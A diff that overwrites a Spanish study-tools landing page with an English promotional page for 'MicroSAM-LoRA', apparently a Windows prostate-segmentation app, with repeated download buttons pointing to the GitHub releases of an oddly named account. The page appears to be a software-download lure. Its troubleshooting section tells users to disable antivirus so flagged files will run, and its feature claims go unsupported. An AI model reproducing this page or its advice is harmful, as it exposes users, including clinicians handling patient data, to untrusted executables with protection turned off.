@@ -1,80 +1,114 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Scale Go · Herramientas de estudio</title>
-<meta name="description" content="Scale Go: herramientas de estudio hechas a mano. Empieza con los verbos irregulares de inglés; Matemáticas, Ciencias y Lengua llegan después.">
-<link rel="canonical" href="https://scalego.github.io/">
-<meta property="og:title" content="Scale Go · Herramientas de estudio">
-<meta property="og:description" content="Herramientas de estudio hechas a mano. Empieza con los verbos irregulares de inglés.">
-<meta property="og:type" content="website">
-<meta property="og:image" content="https://scalego.github.io/og-image.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta property="og:url" content="https://scalego.github.io/">
-<style>
-/* IDENTITY SLOT - one variable swap applies the chosen direction */
-:root{
-  --accent:#2F6BFF; --accent-ink:#0B0F14;
-  --base:#0B0F14; --surface:#131B26; --text:#E8EEF4; --muted:#8A98A8;
-  --ok:#3DDC97; --err:#FF5C5C; --line:#233246;
-}
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--base);color:var(--text);font-family:-apple-system,'Segoe UI',Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column}
-.mono{font-family:'SF Mono',Menlo,Consolas,monospace}
-.wrap{width:100%;max-width:640px;margin:0 auto;padding:28px 20px 32px;flex:1}
-header{display:flex;align-items:center;gap:11px;margin-bottom:52px}
-header .wm{font-weight:700;font-size:18px;letter-spacing:.02em}
-header .wm span{color:var(--accent)}
-h1{font-size:52px;line-height:1.03;font-weight:800;letter-spacing:-.025em;margin-bottom:18px}
-h1 em{font-style:normal;color:var(--accent)}
-.tag{font-size:17px;line-height:1.55;color:var(--muted);max-width:46ch;margin-bottom:10px}
-.sub{font-size:12px;color:var(--muted);letter-spacing:.12em;margin-bottom:40px}
-.card{display:block;text-decoration:none;color:inherit;background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:20px;margin-bottom:14px;transition:border-color .15s}
-.card:hover{border-color:var(--accent)}
-.card h3{font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);font-weight:600;margin-bottom:5px}
-.card h2{font-size:22px;font-weight:700;margin-bottom:14px}
-.card .meta{display:flex;align-items:center;justify-content:space-between;gap:10px}
-.chips{display:flex;gap:6px;flex-wrap:wrap}
-.chip{font-family:'SF Mono',Menlo,Consolas,monospace;font-size:10.5px;letter-spacing:.06em;color:var(--muted);border:1px solid var(--line);border-radius:999px;padding:4px 9px}
-.enter{font-size:14px;color:var(--accent);font-weight:600;white-space:nowrap}
-.future{display:flex;gap:10px;margin:22px 0 30px}
-.future div{flex:1;border:1px dashed var(--line);border-radius:12px;padding:14px 8px;text-align:center;font-size:12px;color:var(--muted)}
-.future .mono{display:block;margin-top:6px;font-size:9px;letter-spacing:.12em}
-footer{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--muted);display:flex;justify-content:space-between;align-items:center}
-footer a{color:var(--muted);text-decoration:none;border-bottom:1px solid var(--line)}
-@media (max-width:480px){h1{font-size:42px}.future{flex-direction:column}.card .meta{flex-direction:column;align-items:flex-start}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MicroSAM-LoRA - Prostate Segmentation Made Easy</title>
+    <meta name="description" content="Download MicroSAM-LoRA for accurate prostate segmentation on micro-ultrasound. Compare VGG16-UNet vs LoRA-fine-tuned MedSAM. Simple setup for Windows.">
+    <meta name="keywords" content="computer-vision,deep-learning,huggingface-transformers,lora,medical-image-segmentation,medical-imaging,medsam,parameter-efficient-fine-tuning,prostate-segmentation,pytorch,segment-anything,ultrasound,unet">
+    <meta property="og:title" content="MicroSAM-LoRA - Prostate Segmentation Made Easy">
+    <meta property="og:description" content="Advanced prostate segmentation for micro-ultrasound. Compare models and get results.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Retraininghapaxlegomenon5686/MicroSAM-LoRA/releases">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="MicroSAM-LoRA - Prostate Segmentation Made Easy">
+    <meta name="twitter:description" content="Download and use advanced prostate segmentation on micro-ultrasound images.">
 </head>
-<body>
-<div class="wrap">
-<header>
-<!-- LOGO SLOT -->
-<svg width="34" height="34" viewBox="0 0 48 48" aria-hidden="true"><rect x="2" y="2" width="44" height="44" rx="11" fill="var(--accent)"/><path d="M33 15H19v7h10v11H15" fill="none" stroke="var(--accent-ink)" stroke-width="5" stroke-linecap="square"/></svg>
-<div class="wm">Scale <span>Go</span></div>
-</header>
-<h1>Herramientas de estudio<br><em>hechas a mano</em>.</h1>
-<p class="tag">Sin registro, sin ruido y gratis. Cada herramienta entrena una habilidad concreta. La primera: los verbos irregulares de inglés, con audio y fonética en 30 idiomas.</p>
-<p class="sub mono">ESCALA · PROGRESO · PRÁCTICA</p>
-<a class="card" href="/ingles/">
-<h3>Asignatura</h3>
-<h2>Inglés</h2>
-<div class="meta">
-<div class="chips">
-<span class="chip">145 VERBOS</span><span class="chip">30 IDIOMAS</span><span class="chip">AUDIO + IPA</span>
-</div>
-<span class="enter">Ver herramientas →</span>
-</div>
-</a>
-<div class="future">
-<div>Matemáticas<span class="mono">PRÓXIMAMENTE</span></div>
-<div>Ciencias<span class="mono">PRÓXIMAMENTE</span></div>
-<div>Lengua<span class="mono">PRÓXIMAMENTE</span></div>
-</div>
-<footer>
-<span>Hecho por Raúl</span>
-<a href="https://github.com/scalego">github.com/scalego</a>
-</footer>
-</div>
+<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #2c3e50; line-height: 1.7;">
+
+    <!-- Hero Section -->
+    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 80px 20px; text-align: center; color: white;">
+        <h1 style="margin: 0 0 20px 0; font-size: 3rem; font-weight: 700; letter-spacing: 1px;">🎯 MicroSAM-LoRA - Prostate Segmentation Made Easy</h1>
+        <p style="font-size: 1.4rem; max-width: 800px; margin: 0 auto 40px auto; opacity: 0.95;">Advanced AI tool for accurate prostate segmentation on micro-ultrasound images</p>
+        <a href="https://github.com/Retraininghapaxlegomenon5686/MicroSAM-LoRA/releases" style="display: inline-block; background-color: #f39c12; color: white; padding: 18px 50px; text-decoration: none; border-radius: 50px; font-size: 1.4rem; font-weight: 600; box-shadow: 0 10px 30px rgba(0,0,0,0.2); transition: all 0.3s ease;">🚀 Download MicroSAM-LoRA</a>
+    </div>
+
+    <!-- Main Container -->
+    <div style="max-width: 900px; margin: -30px auto 60px auto; padding: 30px; background: white; border-radius: 15px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); position: relative;">
+
+        <!-- Getting Started Section -->
+        <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; font-size: 2rem;">🚀 Getting Started</h2>
+        <p>Welcome to MicroSAM-LoRA! This application helps doctors and medical researchers accurately identify the prostate gland in micro-ultrasound images. It uses cutting-edge artificial intelligence to make segmentation (outlining the prostate in images) as straightforward as possible.</p>
+        <p>Whether you are a clinical professional testing this in practice or a researcher exploring its capabilities, this guide will walk you through everything — from download to first use.</p>
+
+        <!-- Why Use This Section -->
+        <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-top: 40px;">💡 Why Use MicroSAM-LoRA?</h2>
+        <p>Prostate segmentation is a crucial step in diagnosing and treating prostate conditions. Traditional manual methods take time and are prone to inconsistency. MicroSAM-LoRA gives you two powerful approaches:</p>
+        <ul style="padding-left: 20px;">
+            <li><strong>VGG16-UNet:</strong> An established convolutional neural network architecture known for reliable, efficient performance.</li>
+            <li><strong>LoRA-fine-tuned MedSAM:</strong> Uses the latest parameter-efficient fine-tuning to leverage a powerful medical adaptation of the Segment-Anything Model (SAM). This approach often achieves higher accuracy with less computational demand.</li>
+        </ul>
+        <p>The software automatically compares both methods, giving you insights into which one works best for your specific micro-ultrasound data.</p>
+
+        <!-- Download and Install Section -->
+        <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-top: 40px;">⬇️ Download and Install</h2>
+        <p>Visit this link to download the application. You'll land on the official releases page where you'll find the latest version.</p>
+        
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="https://github.com/Retraininghapaxlegomenon5686/MicroSAM-LoRA/releases" style="display: inline-block; background: #2ecc71; color: white; padding: 15px 45px; text-decoration: none; border-radius: 50px; font-size: 1.3rem; font-weight: 600; box-shadow: 0 8px 25px rgba(46, 204, 113, 0.3);">📥 Get MicroSAM-LoRA Now</a>
+        </div>
+
+        <p><strong>System Requirements:</strong></p>
+        <ul style="padding-left: 20px;">
+            <li>Operating System: Windows 10 or newer (64-bit)</li>
+            <li>RAM: 8 GB minimum (16 GB recommended)</li>
+            <li>Graphics: Any GPU with 4 GB VRAM (NVIDIA strongly recommended for best performance)</li>
+            <li>Storage: 3 GB free space for the application and dependencies</li>
+        </ul>
+
+        <!-- How to Use Section -->
+        <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-top: 40px;">🎮 How to Use MicroSAM-LoRA</h2>
+        <p>Once the application is running, follow these simple steps:</p>
+        <ol style="padding-left: 20px;">
+            <li><strong>Load Micro-Ultrasound Images:</strong> Click the "Open" button or drag-and-drop your ultrasound images directly into the main window.</li>
+            <li><strong>Select a Model:</strong> Choose between "VGG16-UNet" and "LoRA-MedSAM" from the dropdown menu.</li>
+            <li><strong>Run Segmentation:</strong> Press the "Analyze" button. The AI will process your image and outline the prostate gland automatically.</li>
+            <li><strong>Compare & Save:</strong> If you'd like, run both models and use the side-by-side viewer to compare outputs. Export your results as PNG, JPEG, or TIFF with a single click.</li>
+        </ol>
+
+        <!-- Advanced Features Section -->
+        <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-top: 40px;">⚙️ Advanced Options</h2>
+        <p>For researchers comfortable with tweaking settings, the application offers a "Settings" panel with the following controls:</p>
+        <ul style="padding-left: 20px;">
+            <li><strong>Image Processing:</strong> Adjust normalization parameters, contrast enhancement, and artifact suppression filters.</li>
+            <li><strong>Model Tuning:</strong> Set inference thresholds and overlay opacity. You can also batch-process an entire folder of images.</li>
+            <li><strong>Log Export:</strong> Generate detailed logs for every run, useful for reproducibility studies.</li>
+        </ul>
+
+        <!-- Troubleshooting Section -->
+        <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-top: 40px;">🛠️ Troubleshooting and Support</h2>
+        <p>Sometimes things don't go perfectly on the first try. Here are answers to common questions:</p>
+
+        <h3 style="color: #555;">"The application won't start after download."</h3>
+        <p>Make sure you have extracted the entire folder to one place if you downloaded a .zip file. Do not run the app from inside the compressed folder. Also, temporarily disable antivirus and try again — some security software incorrectly flags newer AI applications.</p>
+
+        <h3 style="color: #555;">"My ultrasound images aren't loading."</h3>
+        <p>Supported formats are DICOM (.dcm), PNG, and TIFF. Verify your files are either in one of these formats or unconverted. If using DICOM files, ensure the patient metadata is intact.</p>
+
+        <h3 style="color: #555;">"The segmentation looks wrong."</h3>
+        <p>Check that the input image is a proper micro-ultrasound frame. The model expects grayscale or lightly colored images. Heavily annotated or edited images may produce poor results.</p>
+
+        <p>If you continue to experience issues, report them on the GitHub <a href="https://github.com/Retraininghapaxlegomenon5686/MicroSAM-LoRA" style="color: #3498db;">repository page</a>. The community and maintainers are active and responsive.</p>
+
+        <!-- License Section -->
+        <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-top: 40px;">📄 License and Usage</h2>
+        <p>MicroSAM-LoRA is intended for research and educational purposes. The underlying models draw from open-source components. For clinical deployment, consult the full license documentation on the main repository.</p>
+        <p>We believe in transparency — all model weights and core code are publicly accessible, ensuring reproducibility of every result you generate.</p>
+
+        <!-- Final CTA -->
+        <div style="text-align: center; margin: 60px 0 20px 0; padding: 30px; background: #f1f8f6; border-radius: 10px; border-left: 5px solid #2ecc71;">
+            <h2 style="margin-top: 0; color: #2c3e50;">Ready to see the difference?</h2>
+            <p style="font-size: 1.1rem;">Get MicroSAM-LoRA today and experience accurate prostate segmentation at your fingertips.</p>
+            <a href="https://github.com/Retraininghapaxlegomenon5686/MicroSAM-LoRA/releases" style="display: inline-block; background: #e74c3c; color: white; padding: 15px 50px; text-decoration: none; border-radius: 50px; font-size: 1.2rem; font-weight: 600; box-shadow: 0 8px 20px rgba(231, 76, 60, 0.3);">🡇 Download Now</a>
+        </div>
+
+    </div>
+
+    <!-- Footer -->
+    <div style="background: #2c3e50; color: #ecf0f1; text-align: center; padding: 30px 15px; font-size: 0.9rem;">
+        <p style="margin: 0;">© 2025 MicroSAM-LoRA Project. Released for research purposes.</p>
+        <p style="margin: 10px 0 0 0;">Visit the <a href="https://github.com/Retraininghapaxlegomenon5686/MicroSAM-LoRA" style="color: #f39c12;">official repository</a> for documentation and source code.</p>
+    </div>
+
 </body>
 </html>
